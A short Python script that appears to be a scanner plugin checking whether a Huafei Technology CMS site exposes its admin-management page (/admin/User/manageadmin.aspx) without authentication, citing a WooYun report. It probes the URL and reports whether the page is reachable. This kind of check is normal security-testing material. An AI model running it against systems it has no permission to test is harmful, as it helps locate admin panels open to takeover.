#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 华飞科技cms绕过JS GETSHELL
referer: http://www.wooyun.org/bugs/wooyun-2010-083888
author: Lucifer
description: /admin/User/manageadmin.aspx 禁用JS可以直接访问。
'''
import sys
import requests
import warnings
def run(url):
        result = ['华飞科技cms绕过JS GETSHELL','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/admin/User/manageadmin.aspx"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            
            if req.status_code == 200 and r"addadmin.aspx" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    